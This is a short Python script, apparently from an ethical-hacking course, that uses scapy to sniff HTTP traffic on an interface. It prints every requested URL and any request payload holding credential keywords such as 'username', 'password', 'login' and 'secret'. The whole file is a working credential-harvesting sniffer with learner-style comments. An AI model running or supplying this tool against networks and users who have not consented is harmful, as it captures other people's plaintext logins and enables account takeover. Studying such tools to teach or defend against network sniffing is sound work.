#!/usr/bin/env python
import scapy.all as scapy
# to sniff http packet pip install scapy_http
# and import http
from scapy.layers import http

def sniff(interface):
    # prn is the callback function which reads every packet of the interface we want to sniff
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # the callback function
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show)
        # this is how to concatenate two strings , see the format at the bottom notes
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)

        if packet.haslayer(scapy.Raw):
            # print(packet[scapy.YOURLAYER].YOURFIELD)
            # print(packet[scapy.Raw].load)
            load = (packet[scapy.Raw].load)
            keywords = ["uname", "username", "user", "login", "login_name","txtUsername", "password", "pass", "secret", "txtPassword"]
            for key in keywords:
                if key in load:
                    print(load)
                    # break to run iterate the list one time
                    break



sniff("eth0")


# with packet.show(you can determine the fields of a layer you want to filter example row and HTTPrequest)
# print(packet.show())
# print(packet)

#SOS SOS SOS #
# EXAMPLE
# print(packet[scapy.YOURLAYER].YOURFIELD)
# print(packet[scapy.Raw].load)
